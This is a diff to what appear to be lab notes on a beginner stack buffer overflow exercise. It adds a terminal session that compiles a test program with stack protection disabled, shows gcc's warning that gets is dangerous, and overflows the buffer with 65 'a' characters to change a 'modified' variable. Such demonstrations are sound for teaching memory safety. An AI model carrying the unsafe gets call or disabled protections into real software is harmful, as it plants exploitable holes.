@@ -63,8 +63,19 @@ Aborted (core dumped)
 ```
 gcc -g bf1.c -o bf1 -fno-stack-protector 
 ```
+```
+ksu@KSU-Ubuntu-1604-32:~$ gcc -g bf1.c -o bf2 -fno-stack-protector 
+bf1.c: In function ‘main’:
+bf1.c:11:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
+   gets(buffer);
+   ^
+/tmp/ccXvaMgd.o: In function `main':
+/home/ksu/bf1.c:11: warning: the `gets' function is dangerous and should not be used.
 
-#### 測試
+ksu@KSU-Ubuntu-1604-32:~$ python -c "print 'a'*65" | ./bf2
+you have changed the 'modified' variable
+```
+#### 測試2 64-bit kali linux
 ```
 gcc -g bf1.c -o bf1
 
